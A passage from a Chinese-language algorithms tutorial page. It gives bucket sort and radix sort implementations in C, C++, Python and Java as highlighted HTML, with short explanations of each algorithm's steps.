class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//排序前数组序列</span></span><br><span class="line">    Show( arr_test, Max_len );</span><br><span class="line">    <span class="comment">//排序</span></span><br><span class="line">    BucketSort( arr_test,  Max_len);</span><br><span class="line">    <span class="comment">//排序后数组序列</span></span><br><span class="line">    Show( arr_test, Max_len );</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="C-：-6"><a href="#C-：-6" class="headerlink" title="C++："></a>C++：</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> BUCKET_NUM = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ListNode</span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">explicit</span> <span class="title">ListNode</span><span class="params">(<span class="type">int</span> i=<span class="number">0</span>)</span>:mData(i),mNext(NULL)&#123;</span>&#125;</span><br><span class="line">        ListNode* mNext;</span><br><span class="line">        <span class="type">int</span> mData;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">ListNode* <span class="title">insert</span><span class="params">(ListNode* head,<span class="type">int</span> val)</span></span>&#123;</span><br><span class="line">        ListNode dummyNode;</span><br><span class="line">        ListNode *newNode = <span class="keyword">new</span> <span class="built_in">ListNode</span>(val);</span><br><span class="line">        ListNode *pre,*curr;</span><br><span class="line">        dummyNode.mNext = head;</span><br><span class="line">        pre = &amp;dummyNode;</span><br><span class="line">        curr = head;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">NULL</span>!=curr &amp;&amp; curr-&gt;mData&lt;=val)&#123;</span><br><span class="line">                pre = curr;</span><br><span class="line">                curr = curr-&gt;mNext;</span><br><span class="line">        &#125;</span><br><span class="line">        newNode-&gt;mNext = curr;</span><br><span class="line">        pre-&gt;mNext = newNode;</span><br><span class="line">        <span class="keyword">return</span> dummyNode.mNext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">ListNode* <span class="title">Merge</span><span class="params">(ListNode *head1,ListNode *head2)</span></span>&#123;</span><br><span class="line">        ListNode dummyNode;</span><br><span class="line">        ListNode *dummy = &amp;dummyNode;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">NULL</span>!=head1 &amp;&amp; <span class="literal">NULL</span>!=head2)&#123;</span><br><span class="line">                <span class="keyword">if</span>(head1-&gt;mData &lt;= head2-&gt;mData)&#123;</span><br><span class="line">                        dummy-&gt;mNext = head1;</span><br><span class="line">                        head1 = head1-&gt;mNext;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        dummy-&gt;mNext = head2;</span><br><span class="line">                        head2 = head2-&gt;mNext;</span><br><span class="line">                &#125;</span><br><span class="line">                dummy = dummy-&gt;mNext;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">NULL</span>!=head1) dummy-&gt;mNext = head1;</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">NULL</span>!=head2) dummy-&gt;mNext = head2;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> dummyNode.mNext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BucketSort</span><span class="params">(<span class="type">int</span> n,<span class="type">int</span> arr[])</span></span>&#123;</span><br><span class="line">        <span class="function">vector&lt;ListNode*&gt; <span class="title">buckets</span><span class="params">(BUCKET_NUM,(ListNode*)(<span class="number">0</span>))</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">                <span class="type">int</span> index = arr[i]/BUCKET_NUM;</span><br><span class="line">                ListNode *head = buckets.<span class="built_in">at</span>(index);</span><br><span class="line">                buckets.<span class="built_in">at</span>(index) = <span class="built_in">insert</span>(head,arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode *head = buckets.<span class="built_in">at</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;BUCKET_NUM;++i)&#123;</span><br><span class="line">                head = <span class="built_in">Merge</span>(head,buckets.<span class="built_in">at</span>(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">                arr[i] = head-&gt;mData;</span><br><span class="line">                head = head-&gt;mNext;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Python：-8"><a href="#Python：-8" class="headerlink" title="Python："></a>Python：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bucket_sort</span>(<span class="params">array</span>):</span><br><span class="line">    min_num, max_num = <span class="built_in">min</span>(array), <span class="built_in">max</span>(array)</span><br><span class="line">    bucket_num = (max_num-min_num)//<span class="number">3</span> + <span class="number">1</span></span><br><span class="line">    buckets = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(bucket_num))]</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> array:</span><br><span class="line">        buckets[<span class="built_in">int</span>((num-min_num)//<span class="number">3</span>)].append(num)</span><br><span class="line">    new_array = <span class="built_in">list</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> buckets:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">sorted</span>(i):</span><br><span class="line">            new_array.append(j)</span><br><span class="line">    <span class="keyword">return</span> new_array</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    array = [<span class="number">5</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>]</span><br><span class="line">    <span class="built_in">print</span>(bucket_sort(array))</span><br></pre></td></tr></table></figure><h5 id="Java：-8"><a href="#Java：-8" class="headerlink" title="Java："></a>Java：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BucketSort</span> <span class="keyword">implements</span> <span class="title class_">IArraySort</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">InsertSort</span> <span class="variable">insertSort</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InsertSort</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sort(<span class="type">int</span>[] sourceArray) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 对 arr 进行拷贝，不改变参数内容</span></span><br><span class="line">        <span class="type">int</span>[] arr = Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bucketSort(arr, <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] bucketSort(<span class="type">int</span>[] arr, <span class="type">int</span> bucketSize) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> arr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">minValue</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxValue</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> value : arr) &#123;</span><br><span class="line">            <span class="keyword">if</span> (value &lt; minValue) &#123;</span><br><span class="line">                minValue = value;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value &gt; maxValue) &#123;</span><br><span class="line">                maxValue = value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">bucketCount</span> <span class="operator">=</span> (<span class="type">int</span>) Math.floor((maxValue - minValue) / bucketSize) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span>[][] buckets = <span class="keyword">new</span> <span class="title class_">int</span>[bucketCount][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 利用映射函数将数据分配到各个桶中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (<span class="type">int</span>) Math.floor((arr[i] - minValue) / bucketSize);</span><br><span class="line">            buckets[index] = arrAppend(buckets[index], arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">arrIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] bucket : buckets) &#123;</span><br><span class="line">            <span class="keyword">if</span> (bucket.length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 对每个桶进行排序，这里使用了插入排序</span></span><br><span class="line">            bucket = insertSort.sort(bucket);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> value : bucket) &#123;</span><br><span class="line">                arr[arrIndex++] = value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 自动扩容，并保存数据</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arr</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] arrAppend(<span class="type">int</span>[] arr, <span class="type">int</span> value) &#123;</span><br><span class="line">        arr = Arrays.copyOf(arr, arr.length + <span class="number">1</span>);</span><br><span class="line">        arr[arr.length - <span class="number">1</span>] = value;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="十、基数排序"><a href="#十、基数排序" class="headerlink" title="十、基数排序"></a>十、基数排序</h3><h4 id="1-算法步骤-9"><a href="#1-算法步骤-9" class="headerlink" title="1.算法步骤"></a>1.算法步骤</h4><p>将整数按位数切割成不同的数字，然后按每个位数分别比较。</p><p>由于整数也可以表达字符串（比如名字或日期）和特定格式的浮点数，所以基数排序也不是只能使用于整数。</p><p>​基数排序：根据键值的每位数字来分配桶；</p><p>​计数排序：每个桶只存储单一键值；</p><p>​桶排序：每个桶存储一定范围的数值；</p><h4 id="2-代码实现-9"><a href="#2-代码实现-9" class="headerlink" title="2.代码实现"></a>2.代码实现</h4><h5 id="C：-7"><a href="#C：-7" class="headerlink" title="C："></a>C：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX 20</span></span><br><span class="line"><span class="comment">//#define SHOWPASS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BASE 10</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, a[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">radixsort</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i, b[MAX], m = a[<span class="number">0</span>], <span class="built_in">exp</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a[i] &gt; m) &#123;</span><br><span class="line">      m = a[i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (m / <span class="built_in">exp</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="type">int</span> bucket[BASE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">      bucket[(a[i] / <span class="built_in">exp</span>) % BASE]++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; BASE; i++) &#123;</span><br><span class="line">      bucket[i] += bucket[i - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">      b[--bucket[(a[i] / <span class="built_in">exp</span>) % BASE]] = a[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">      a[i] = b[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exp</span> *= BASE;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHOWPASS</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nPASS   : &quot;</span>);</span><br><span class="line">    print(a, n);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> arr[MAX];</span><br><span class="line">  <span class="type">int</span> i, n;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter total elements (n &lt;= %d) : &quot;</span>, MAX);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  n = n &lt; MAX ? n : MAX;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter %d Elements : &quot;</span>, n);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;arr[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nARRAY  : &quot;</span>);</span><br><span class="line">  print(&amp;arr[<span class="number">0</span>], n);</span><br><span class="line"></span><br><span class="line">  radixsort(&amp;arr[<span class="number">0</span>], n);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nSORTED : &quot;</span>);</span><br><span class="line">  print(&amp;arr[<span class="number">0</span>], n);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="C-：-7"><a href="#C-：-7" class="headerlink" title="C++："></a>C++：</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">maxbit</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n)</span> <span class="comment">//辅助函数，求数据的最大位数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> maxData = data[<span class="number">0</span>];              <span class="comment">///&lt; 最大数</span></span><br><span class="line">    <span class="comment">/// 先求出最大数，再求其位数，这样有原先依次每个数判断其位数，稍微优化点。</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (maxData &lt; data[i])</span><br><span class="line">            maxData = data[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> d = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> p = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">while</span> (maxData &gt;= p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//p *= 10; // Maybe overflow</span></span><br><span class="line">        maxData /= <span class="number">10</span>;</span><br><span class="line">        ++d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line"><span class="comment">/*    int d = 1; //保存最大的位数</span></span><br><span class="line"><span class="comment">    int p = 10;</span></span><br><span class="line"><span class="comment">    for(int i = 0; i &lt; n; ++i)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        while(data[i] &gt;= p)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            p *= 10;</span></span><br><span class="line"><span class="comment">            ++d;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return d;*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">radixsort</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n)</span> <span class="comment">//基数排序</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> d = <span class="built_in">maxbit</span>(data, n);</span><br><span class="line">    <span class="type">int</span> *tmp = <span class="keyword">new</span> <span class="type">int</span>[n];</span><br><span class="line">    <span class="type">int</span> *count = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>]; <span class="comment">//计数器</span></span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line">    <span class="type">int</span> radix = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">1</span>; i &lt;= d; i++) <span class="comment">//进行d次排序</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++)</span><br><span class="line">            count[j] = <span class="number">0</span>; <span class="comment">//每次分配前清空计数器</span></span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            k = (data[j] / radix) % <span class="number">10</span>; <span class="comment">//统计每个桶中的记录数</span></span><br><span class="line">            count[k]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">1</span>; j &lt; <span class="number">10</span>; j++)</span><br><span class="line">            count[j] = count[j - <span class="number">1</span>] + count[j]; <span class="comment">//将tmp中的位置依次分配给每个桶</span></span><br><span class="line">        <span class="keyword">for</span>(j = n - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) <span class="comment">//将所有桶中记录依次收集到tmp中</span></span><br><span class="line">        &#123;</span><br><span class="line">            k = (data[j] / radix) % <span class="number">10</span>;</span><br><span class="line">            tmp[count[k] - <span class="number">1</span>] = data[j];</span><br><span class="line">            count[k]--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; n; j++) <span class="comment">//将临时数组的内容复制到data中</span></span><br><span class="line">            data[j] = tmp[j];</span><br><span class="line">        radix = radix * <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span> []tmp;</span><br><span class="line">    <span class="keyword">delete</span> []count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Python：-9"><a href="#Python：-9" class="headerlink" title="Python："></a>Python：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">radix_sort</span>(<span class="params">arr:<span class="type">List</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(<span class="built_in">str</span>(<span class="built_in">max</span>(arr)))  <span class="comment"># 记录最大值的位数</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n):<span class="comment">#n轮排序</span></span><br><span class="line">        <span class="comment"># 每一轮生成10个列表</span></span><br><span class="line">        bucket_list=[[] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]<span class="comment">#因为每一位数字都是0~9，故建立10个桶</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">            <span class="comment"># 按第k位放入到桶中</span></span><br><span class="line">            bucket_list[i//(<span class="number">10</span>**k)%<span class="number">10</span>].append(i)</span><br><span class="line">        <span class="comment"># 按当前桶的顺序重排列表</span></span><br><span class="line">        arr=[j <span class="keyword">for</span> i <span class="keyword">in</span> bucket_list <span class="keyword">for</span> j <span class="keyword">in</span> i]</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    random.seed(<span class="number">54</span>)</span><br><span class="line">    arr = [random.randint(<span class="number">0</span>,<span class="number">100</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span 